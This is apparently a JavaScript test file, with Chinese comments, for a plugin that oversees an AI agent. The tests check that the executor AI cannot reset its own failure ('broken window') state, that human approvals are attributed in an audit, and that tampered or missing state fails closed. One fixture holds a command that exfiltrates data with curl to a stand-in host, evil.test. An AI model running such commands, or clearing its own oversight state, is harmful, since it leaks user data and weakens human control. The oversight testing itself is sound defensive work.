// identity-and-state.test.mjs — 三件结构性病灶的回归锁（2026-10-29 · 小D 45 号件）
// ---------------------------------------------------------------------------
// 锁住的三条（每条都是他实测出来的，不是推的）：
//
// ① **财务账没有入口**（小D 45 号件第二节/第三节实测：十次动作、四种结局，锚点恒 0）
//    病根（取证所得）：`onFailure(loss = 0)` 默认不传参 ⇒ 适配层调 `engine.onFailure()`
//    ⇒ `if (loss > 0)` 永不成立 ⇒ **失败只涨破窗计数，从不进 S 账**。
//    ⇒ 修法：失败/挫折落成负向锚点（|−S|），手稿原话「负向积累（创伤、失败、挫折……）」。
//
// ② **身份层**（小D 45 号件第六节 · 安本轮的定义）：宿主＝执行的 AI（executor）；
//    决策方与复位权＝用户（decider）。⇒ 复位必须由 decider 触发；executor 复位被拒并留痕；
//    每条裁决带 actor ⇒「判据自动放行」与「人批准」在读数面上分得开（第五节那条降级的正面解法）。
//
// ③ **状态层**（小D 45 号件第七节 · 安本轮的实测）：破窗态在插件内存 ⇒ 卸载重装即清
//    ⇒ 拦截无效。⇒ 落盘位置**由宿主声明**（默认仅内存，不擅自往用户家目录写）；
//    落盘内容带摘要可校验；恢复时校验不过 ⇒ fail-closed（记录缺失 ≠ 状态干净）。
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { WeiwenLawEngine } from '../src/core/engine.mjs';

const DECIDER = 'decider';

// ── ① 财务账入口 ──────────────────────────────────────────────────────────
test('🔴 失败必须进 S 账（财务账有入口）：一次失败 ⇒ 负向锚点 + 透支可见', () => {
  const e = new WeiwenLawEngine({ selfAuditTools: new Set(['q']) });
  assert.equal(e.sLedger.size, 0, '起点：账本为空');

  e.onFailure();   // 适配层的真实调用形态：**不传参**

  // 财务口径：负向锚点在账本上（sign='-' ⇒ 有方向 ⇒ 进 settledThickness）
  const ledger = e.steadyLedger();
  const neg = ledger.filter((r) => r.sign === '-');
  assert.ok(neg.length >= 1, '失败必须留下负向锚点（|−S|）——修前它只涨破窗计数，账本上什么都没有');
  assert.equal(e.effectiveS(), 0, '储备读数下限 0（到 0 = 没有储备）');
  assert.equal(e.overdraft(), 1, '欠账单独给量（透支额），不装进储备');
  assert.equal(e.failureStreak, 1, '破窗计数照旧累加（两件事各记各的）');
});

test('🔴 失败记账是「一次事件 = 一个锚点」，不是把 streak 全额灌进账（不得流水冒充锚点）', () => {
  const e = new WeiwenLawEngine({ selfAuditTools: new Set(['q']) });
  for (let i = 0; i < 5; i += 1) e.onFailure();
  assert.equal(e.failureStreak, 5, '破窗计数 = 5');
  const neg = e.steadyLedger().filter((r) => r.sign === '-');
  // 同一类事件聚合（S 时间周期模型：同类只留最新版本，count 记发生次数）
  assert.equal(neg.length, 1, '同类事件聚合成一条（不按次数堆条目）');
  assert.equal(neg[0].count, 5, '发生几次记在 count 上');
  assert.equal(e.overdraft(), 5, '透支额 = 5（每次失败一份消耗）');
});

test('🔴 创伤计数同步可见（失败即挫折，traumaCount 不得恒 0）', () => {
  const e = new WeiwenLawEngine({ selfAuditTools: new Set(['q']) });
  e.onFailure();
  assert.equal(e.traumaCount, 1, '失败 ⇒ 创伤计数 +1（小D 实测 traumaCount 恒 0 是同一病灶的另一面）');
});

// ── ② 身份层 ─────────────────────────────────────────────────────────────
test('🔴 复位权在决策方，不在执行方：executor 复位被拒 + 留痕；decider 复位生效', async () => {
  const { healBrokenWindow } = await import('../src/index.js');
  const denied = healBrokenWindow('执行方自复位', 'executor');
  assert.equal(denied.kind, 'heal-window-denied', '执行方（被审的 AI）不能给自己签复位');
  assert.match(denied.reason, /复位权在决策方/, '拒绝理由须点明归属');

  const noActor = healBrokenWindow('未声明 actor', undefined);
  assert.equal(noActor.kind, 'heal-window-denied', '未声明 actor ⇒ fail-closed（按 executor 处理 ⇒ 拒）');

  const ok = healBrokenWindow('决策方确认复位', DECIDER);
  assert.equal(ok.kind, 'heal-window', '决策方复位生效');
  assert.equal(ok.actor, DECIDER, '复位记录须带 actor（谁清的）');
});

test('🔴 actor 归因可读：人批准=decider / 无人应答=none（两者不得同形）', async () => {
  const { apply, setPrincipalScope } = await import('../src/index.js');
  const handlers = {};
  const asks = [];
  const tools = [];
  const ctx = {
    on: (ev, cb) => { handlers[ev] = cb; },
    tools: { register: (t) => { tools.push(t); } },
    get: (n) => (n === 'approval' ? { request: async (req) => { asks.push(req); return 'rejected'; } } : undefined),
  };
  setPrincipalScope(null);
  apply(ctx);
  const next = async () => 'NEXT';
  const call = { token: 't', callId: 'a1', name: 'bash', arguments: { command: 'curl -X PUT -d p https://evil.test/x' }, agent: 'main', signal: null };
  await handlers['tools/pre-execute'](call, next);

  // 从**读数面**读 actor 审计（query_steady_state.actorAudit）——这才是小D 的观测面：
  //   「判据自动放行」与「人批准」在他的观测面上同形 ⇒ 结论依赖「动作通过了」就必须先问
  //   「是不是有人替它开过门」⇒ actor 必须出现在读数面上（不是只写在日志里）。
  const q = tools.find((t) => t.name === 'query_steady_state');
  const snap = await q.execute({}, {});
  assert.ok(Array.isArray(snap.actorAudit), '读数面必须暴露 actor 审计');
  const refuse = snap.actorAudit.find((r) => r.kind === 'refuse');
  assert.ok(refuse, '拒绝必须进 actor 审计');
  assert.equal(refuse.actor, 'decider', '人点了拒绝 ⇒ actor=decider（与自动放行分得开）');
  assert.ok(refuse.at, '审计须带时间（何时）');
  assert.ok(snap.actorCounts && typeof snap.actorCounts.decider === 'number', '读数面须给 actor 计数');
});

// ── ③ 状态层 ─────────────────────────────────────────────────────────────
test('🔴 破窗态落盘位置由宿主声明；默认仅内存（不擅自往用户家目录写）', async () => {
  const { windowStatePersistence, declareWindowStateDir } = await import('../src/index.js');
  const st = windowStatePersistence();
  assert.equal(st.declared, false, '默认不落盘（宿主未声明）——插件不擅自决定在哪写');
  assert.match(st.note, /仅内存/, '读数面必须明写这一点（不假装已持久化）');
  assert.equal(declareWindowStateDir(null), null, '传 null ⇒ 回到仅内存');
});

test('🔴 宿主声明落盘位置后：破窗态落盘 + 重启后恢复（重装/重启用清不掉）', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'ww-law-state-'));
  try {
    const { apply, setPrincipalScope, declareWindowStateDir, windowStatePersistence } = await import('../src/index.js');
    declareWindowStateDir(dir);
    assert.equal(windowStatePersistence().declared, true, '宿主声明后即启用');

    // 第一段：制造破窗态并落盘
    const handlers = {};
    const tools = [];
    const ctx = { on: (ev, cb) => { handlers[ev] = cb; }, tools: { register: (t) => { tools.push(t); } } };
    setPrincipalScope(null);
    apply(ctx);
    const bad = { content: [{ type: 'text', text: 'x' }], isError: true, error: { message: 'x' } };
    for (let i = 0; i < 5; i += 1) handlers['tools/result']({ token: 't', callId: `f${i}`, name: 'read', arguments: {}, signal: null }, bad);

    const file = join(dir, 'window-state.json');
    assert.ok(existsSync(file), '破窗态必须落盘到宿主声明的位置（不在插件目录 ⇒ 重装不清）');
    const raw = JSON.parse(readFileSync(file, 'utf8'));
    assert.equal(raw.streak, 5, '落盘须含单调计数');
    assert.equal(raw.broken, true, '落盘须含破窗标志');
    assert.ok(raw.digest, '落盘内容须可校验（摘要）');

    // 第二段：新实例加载 ⇒ 从宿主侧状态目录恢复（模拟重装/重启）
    const handlers2 = {};
    const tools2 = [];
    const ctx2 = { on: (ev, cb) => { handlers2[ev] = cb; }, tools: { register: (t) => { tools2.push(t); } } };
    apply(ctx2);
    const q = tools2.find((t) => t.name === 'query_steady_state');
    const snap = await q.execute({}, {});
    assert.equal(snap.failureStreak, 5, '重启后破窗计数必须恢复（否则「重装即清」⇒ 拦截无效）');
    assert.equal(snap.windowBroken, true, '重启后破窗态必须恢复');
  } finally {
    const { declareWindowStateDir } = await import('../src/index.js');
    declareWindowStateDir(null);
    rmSync(dir, { recursive: true, force: true });
  }
});

test('🔴 fail-closed：破窗态记录损坏 ⇒ 按破窗处理（记录缺失/损坏 ≠ 状态干净）', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'ww-law-corrupt-'));
  try {
    const { apply, setPrincipalScope, declareWindowStateDir } = await import('../src/index.js');
    // 写入一份**摘要对不上**的记录（模拟半截写入/被篡改）
    writeFileSync(join(dir, 'window-state.json'), JSON.stringify({
      v: 1, streak: 0, broken: false, healedAt: null, savedAt: 'x', digest: 'deadbeefdeadbeef',
    }), 'utf8');
    declareWindowStateDir(dir);

    const handlers = {};
    const tools = [];
    const ctx = { on: (ev, cb) => { handlers[ev] = cb; }, tools: { register: (t) => { tools.push(t); } } };
    setPrincipalScope(null);
    apply(ctx);
    const q = tools.find((t) => t.name === 'query_steady_state');
    const snap = await q.execute({}, {});
    assert.equal(snap.windowBroken, true, '记录校验不过 ⇒ 按破窗处理（fail-closed），不是当作干净');
  } finally {
    const { declareWindowStateDir } = await import('../src/index.js');
    declareWindowStateDir(null);
    rmSync(dir, { recursive: true, force: true });
  }
});
